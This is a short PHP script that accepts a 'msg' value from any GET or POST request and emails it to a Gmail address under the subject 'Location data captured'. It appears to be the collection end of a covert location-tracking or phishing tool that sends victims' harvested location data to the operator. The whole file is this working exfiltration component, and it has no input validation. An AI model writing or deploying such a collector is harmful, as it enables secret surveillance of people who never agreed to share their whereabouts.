<?php
if( $_POST ) {
    $message  = $_POST['msg'];
    //$message = wordwrap($msg, 70);
    mail("to@gmail.com", "Location data captured", $message);
}

if( $_GET ) {
    $message = $_GET['msg'];
    //$msg = wordwrap($msg, 70);
    mail("to@gmail.com", "Location data captured", $message);
}
?>
